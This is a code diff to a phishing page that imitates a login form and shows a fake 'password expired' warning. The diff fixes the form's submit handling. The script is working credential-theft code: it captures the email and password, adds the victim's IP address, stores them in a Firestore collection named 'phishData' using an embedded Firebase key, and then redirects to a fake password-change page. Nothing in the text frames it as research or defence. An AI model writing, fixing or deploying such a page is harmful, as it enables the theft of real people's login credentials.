@@ -41,7 +41,7 @@
             <form id="loginForm">
                 <input type="email" id="email" placeholder="Email or phone" required>
                 <input type="password" id="password" placeholder="Password" required>
-                <button type="submit" class="next-btn">Next</button>
+                <button type="button" id="nextBtn" class="next-btn">Next</button>
             </form>
             <div id="errorMessage" class="error">Your password has expired for security reasons. Please update it now to continue.</div>
         </div>
@@ -54,10 +54,9 @@
     </div>
     <div class="lang">English (United States)</div>
 
-    <script type="module">
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-app.js";
-        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore.js";
-
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore.js"></script>
+    <script>
         const firebaseConfig = {
             apiKey: "AIzaSyBPoNHW1nCw67FC37F9tASk2Ydukfhs1cc",
             authDomain: "checker-fd9c6.firebaseapp.com",
@@ -67,26 +66,30 @@
             appId: "1:24257534297:web:a90c06b4325384f26c9448"
         };
 
-        const app = initializeApp(firebaseConfig);
-        const db = getFirestore(app);
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.firestore();
 
-        document.getElementById('loginForm').addEventListener('submit', async (e) => {
-            e.preventDefault();
-            console.log('Form submitted'); // Debug log
+        document.getElementById('nextBtn').addEventListener('click', async () => {
+            console.log('Button clicked'); // Debug
             const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
+            if (!email || !password) {
+                alert('Please fill in both fields.');
+                return;
+            }
             try {
-                await addDoc(collection(db, "phishData"), {
+                console.log('Sending to Firebase...');
+                await db.collection('phishData').add({
                     type: "login",
                     email: email,
                     password: password,
                     timestamp: new Date().toISOString(),
                     ip: await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => d.ip)
                 });
-                console.log('Data sent to Firebase, redirecting...'); // Debug log
+                console.log('Success, redirecting...');
                 window.location.href = "password-change.html?email=" + encodeURIComponent(email);
             } catch (error) {
-                console.error('Firebase error:', error); // Debug log
+                console.error('Error:', error);
                 document.getElementById('errorMessage').style.display = 'block';
             }
         });
